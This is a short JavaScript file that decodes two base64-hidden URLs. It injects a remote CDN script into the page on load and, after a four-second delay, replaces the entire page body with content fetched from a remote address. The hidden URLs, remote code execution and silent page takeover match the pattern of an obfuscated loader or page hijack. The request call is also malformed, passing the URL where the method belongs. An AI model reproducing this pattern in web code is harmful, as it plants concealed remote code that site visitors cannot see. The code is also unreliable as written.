function DormLog()
{
    
    var Db = 
            {
                "key":"aHR0cHM6Ly9zcGF0LWNsb3VkLmdpdGh1Yi5pby9kYXRhL0lucHV0"
            };
	    var GetData = new XMLHttpRequest();
	    GetData.onload = function()
			     {
				 $HTag('body')[0].innerHTML = this.responseText;
			     }
			     GetData.open($Hdecode64(Db.key),true);
			     GetData.send();
			     
}
function HSAPP()
    {
       var SiteKey = "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL1NQQVQtQ0xPVUQvZGF0YUBtYWluL0hhclNjcmlwdC9IYXJTY3JpcHQudjIuOS5MYXRlc3QubWluLmpz";
       var f = document.createElement('script');
       f.async="";
       f.src=$Hdecode64(SiteKey);
       document.head.appendChild(f);
    }
setTimeout(DormLog,4000);
document.addEventListener('DOMContentLoaded',function(){HSAPP();});
